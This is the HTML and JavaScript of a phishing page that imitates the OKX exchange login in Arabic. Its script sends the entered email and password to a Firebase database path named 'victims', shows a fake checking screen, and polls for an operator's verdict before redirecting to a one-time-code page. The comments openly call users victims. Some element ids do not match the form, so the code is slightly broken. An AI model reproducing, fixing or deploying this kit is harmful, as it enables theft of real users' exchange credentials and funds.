<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>تسجيل الدخول | OKX</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { direction: rtl; font-family: sans-serif; background: #fff; }
        .login-box { max-width: 400px; margin: 50px auto; padding: 20px; }
        .tabs { display: flex; border-bottom: 1px solid #eee; margin-bottom: 20px; }
        .tab { padding: 10px 20px; cursor: pointer; color: #666; }
        .tab.active { color: #000; border-bottom: 2px solid #000; font-weight: bold; }
        .form-control { border-radius: 12px; padding: 15px; background: #f5f5f5; border: none; margin-bottom: 15px; text-align: right; }
        .btn-next { background: #000; color: #fff; border-radius: 30px; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #333; }
        .social-btn { border: 1px solid #ddd; border-radius: 30px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; text-decoration: none; color: #000; font-weight: 500; transition: 0.3s; }
        .social-btn:hover { background: #f9f9f9; }
        .social-btn img { width: 20px; }
        .logo-img { margin-bottom: 30px; object-fit: contain; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="logo.png" width="80" class="logo-img" alt="OKX Logo">
    
    <h2 style="font-weight: bold; margin-bottom: 25px;">تسجيل الدخول</h2>
    
    <div class="tabs">
        <div class="tab active" id="phoneTab" onclick="switchTab('phone')">الهاتف</div>
        <div class="tab" id="emailTab" onclick="switchTab('email')">البريد الإلكتروني</div>
    </div>

    <form action="check.html">
        <input type="text" name="username" id="loginInput" class="form-control" placeholder="رقم الهاتف" required>
        <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
        
        <button type="button" onclick="sendData()">Login</button>
    </form>

    <div class="text-center my-4" style="color: #888; font-size: 14px; position: relative;">
        <hr style="border-top: 1px solid #eee;">
        <span style="position: absolute; top: -12px; background: #fff; padding: 0 15px; left: 50%; transform: translateX(-50%);">أو تابع مع</span>
    </div>

    <a href="google-login.html" class="social-btn">
    <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" alt="Google"> 
    Google
   </a>
</div>
    <a href="/login/apple" class="social-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple"> 
        Apple
    </a>
</div>

<script>
    function switchTab(type) {
        const input = document.getElementById('loginInput');
        const phoneTab = document.getElementById('phoneTab');
        const emailTab = document.getElementById('emailTab');

        if (type === 'phone') {
            input.placeholder = 'رقم الهاتف';
            phoneTab.classList.add('active');
            emailTab.classList.remove('active');
        } else {
            input.placeholder = 'البريد الإلكتروني / الحساب الفرعي';
            emailTab.classList.add('active');
            phoneTab.classList.remove('active');
        }
    }
</script>

<script>
    // 1. رابط الفايربيز بتاعك (تأكد إنه صح)
    const DB_URL = "https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims.json";

    async function sendData() {
        // 2. جلب القيم من الخانات (تأكد إن الـ id بتاع الخانات عندك هو email و password)
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (!email || !password) {
            alert("يرجى إدخال البيانات كاملة");
            return;
        }

        // إظهار شكل "جاري الفحص" للضحية
        document.getElementById('loading-screen').style.display = 'block'; 

        // 3. إرسال البيانات للفايربيز بوضعية "pending"
        const response = await fetch(DB_URL, {
            method: "POST",
            body: JSON.stringify({
                email: email,
                password: password,
                status: "pending",
                timestamp: new Date().getTime()
            })
        });

        const data = await response.json();
        const victimId = data.name; // ده المعرف الفريد اللي الفايربيز عمله

        // 4. الرادار: بيفضل يسأل الفايربيز كل ثانيتين "السكربت قال إيه؟"
        const checkInterval = setInterval(async () => {
            const checkRes = await fetch(`https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims/${victimId}.json`);
            const statusData = await checkRes.json();

            if (statusData.status === "wrong") {
                clearInterval(checkInterval);
                document.getElementById('loading-screen').style.display = 'none';
                alert("بيانات تسجيل الدخول غير صحيحة، حاول مجدداً.");
            } 
            else if (statusData.status === "valid") {
                clearInterval(checkInterval);
                // لو البيانات صح، بنوديه لصفحة الـ OTP الأول فوراً
                window.location.href = "otp1.html?id=" + victimId;
            }
        }, 2000); 
    }
</script>
    
</body>
</html>
